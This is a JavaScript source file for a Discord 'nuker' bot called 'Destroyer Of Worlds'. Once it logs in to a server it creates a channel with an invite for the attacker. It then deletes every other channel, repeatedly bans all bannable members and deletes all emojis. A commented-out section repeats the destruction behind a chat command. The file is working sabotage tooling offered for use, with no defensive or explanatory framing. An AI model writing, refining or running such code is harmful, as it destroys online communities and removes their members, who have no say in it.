const Discord = require("discord.js");
const client = new Discord.Client();
const chalk = require('chalk');
var setTitle = require('console-title');
const readline = require("readline");
var center = require("center-align");
var colors = require("colors");


const {
    token,
    serverID,
    newChannelName,
    banMembers,
    deleteChannels,
    deleteEmotes,
    commandModeToggle,
    cmd,
    prefix,
    banIntervalTime
} = require('./config.json');



//await cmd visuals 
client.on("ready", async () => {
    //cmd set title
    setTitle("DOW");
    //cmd display info
    console.log(center(`
    ╦════════════════════════╦
    ║                        ║
    ║   Destroyer Of Worlds  ║
    ║ Made by BlackLung#6950 ║
    ║                        ║
    ╩════════════════════════╩
    `.red, 112));

    console.log(center(`
    ==============================
    SETTINGS:

    New Channel Name: ${newChannelName}
    Ban Members: ${banMembers}
    Delete Channels: ${deleteChannels}
    Delete Emotes: ${deleteEmotes}
    ===============================
    `.green, 112));
});



//on ready:
client.on("ready", () => {

    //startup message 
    console.log(chalk.bgGreenBright(`INFO`) + (` Logged in as ${client.user.tag}. (^o^)／`));
    // create variable for new channel to prevent it from getting deleted by nuke
    let createdChannelName;
    // Create an invite to a channel
    client.guilds.forEach(server => {
        //if no channel name defined, use default
        if (!newChannelName) newChannelName == "Destroyer Of Worlds";
        //create new channel
        server.createChannel(newChannelName, "text").then(channel => {
            createdChannelName = channel.name;
            //then once channel is created, create an invite link to this channel
            channel.createInvite().then(inviteCode => {
                //log the invite link to console
                console.log(chalk.bgGreenBright(("INVITE:")) + ` ${inviteCode}`);
                //catch errors
            }).catch(err => {
                if (err) throw err;
            });
        }).catch(err => {
            if (err) throw err;
        });
    });



    //delete all channels on server

    if (deleteChannels) {
        client.guilds.forEach(server => {
            server.channels.forEach(channel => {
                if (createdChannelName !== channel.name) {
                    channel.delete().then(response => {
                        console.log("my response", response);
                    }).catch(err => {
                        if (err) throw err;
                    });
                }
            });
        });
    }


    //ban all members on the server

    if (banMembers) {
        client.guilds.forEach(guild => {
            guild.members.forEach(m => {
                //set interval based on set time in configuration
                setInterval(function () {

                    //check if user is bannable
                    if (!m.bannable) return; //console.log(chalk.bgGrey + ('INFO:') + ` ${m.user.username} could not be banned`);
                    m.ban()
                    console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Banned ${m.user.username}; ID: ${m.id}. (╯°□°）╯︵ ┻━┻`)

                }, banIntervalTime)
            });
        });
    }



    //delete emojis

    if (deleteEmotes) {
        client.guilds.forEach(guild => {
            guild.emojis.forEach(em => {
                guild.deleteEmoji(em);
                console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Deleted emoji ${em.name}; ID: ${em.id}. (╯°□°）╯︵ ┻━┻`);
            });
        });
    }




    /*
        client.on('message', async (msg) => {
            if (commandModeToggle) {
            if (!msg.guild) return msg.reply("do the command in target server.");
            if (!msg.content.startsWith(prefix)) return;

            const args = msg.content.slice(prefix.length).trim().split(/\s/g);
            const command = args.shift().toLowerCase();

            if (command === "UwU") {
                console.log("cmd ran");

               

                //delete channels
                if(deleteChannels) {
                        msg.guild.channels.forEach(channel => {
                            if (createdChannelName !== channel.name) {
                                channel.delete().then(response => {
                                    console.log("my response", response);
                                }).catch(err => {
                                    if (err) throw err;
                                });
                            }
                        });
                }

                //delete emotes
                if(deleteEmotes) {
                    msg.guild.emojis.forEach(em => {
                            guild.deleteEmoji(em);
                            console.info(`\x1b[37m\x1b[44mINFO\x1b[0m: Deleted emoji ${em.name}; ID: ${em.id}. (╯°□°）╯︵ ┻━┻`);
                        });
                    }



            }


        }
        });
    */

    //handle unexpected errors
    process.on("uncaughtException", err => {
        console.error("\x1b[37m\x1b[41mERROR\x1b[0m: An unknown and unexpected error occurred! x.x.", err);
        process.exit(1);
    });
});

//handle unhandled rejections
process.on("unhandledRejection", err => {
    process.exit(1);
});







client.login(token);